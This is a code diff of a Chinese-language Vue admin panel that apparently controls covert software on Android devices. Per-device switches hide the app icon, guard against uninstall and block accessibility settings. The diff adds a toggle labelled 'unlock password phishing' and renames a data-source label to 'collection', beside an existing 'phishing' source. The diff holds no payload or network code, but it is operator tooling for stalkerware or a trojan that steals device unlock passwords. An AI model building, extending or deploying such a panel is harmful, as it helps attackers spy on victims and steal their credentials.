@@ -29,7 +29,7 @@
       </el-form-item>
 
       <el-form-item>
-        <el-select v-model="dataForm.status" placeholder="状态">
+        <el-select v-model="dataForm.status" placeholder="状态" clearable>
           <el-option label="熄屏" :value="0"></el-option>
           <el-option label="亮屏" :value="1"></el-option>
         </el-select>
@@ -66,7 +66,7 @@
         <template v-slot="scope">{{ scope.row.ip }} / {{ scope.row.addr }}</template>
       </el-table-column>
 
-      <el-table-column label="开关" header-align="center" align="right" width="130px">
+      <el-table-column label="开关" header-align="center" align="right" width="150px">
         <template v-slot="scope">
           <el-switch inactive-text="隐藏图标" :model-value="!!scope.row.hideIcon"
             @update:model-value="updateDeviceSwitch(scope.row, 'hideIcon', $event)" />
@@ -74,7 +74,7 @@
             @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
           <el-switch inactive-text="阻止无障碍" :model-value="!!scope.row.accessibilityGuard"
             @update:model-value="updateDeviceSwitch(scope.row, 'accessibilityGuard', $event)" />
-          <!-- <el-switch inactive-text="固定锁屏" :model-value="!!scope.row.fixLockScreen" @update:model-value="updateDeviceSwitch(scope.row, 'fixLockScreen', $event)" /> -->
+          <el-switch inactive-text="解锁密码钓鱼" :model-value="!!scope.row.unlockFish" @update:model-value="updateDeviceSwitch(scope.row, 'unlockFish', $event)" />
         </template>
       </el-table-column>
       <el-table-column label="设备状态" header-align="center" align="right" width="150px">
@@ -560,7 +560,7 @@ export default defineComponent({
           source = "钓鱼";
           break
         case 2:
-          source = "解锁";
+          source = "采集";
           break
         default:
           source = "未知";
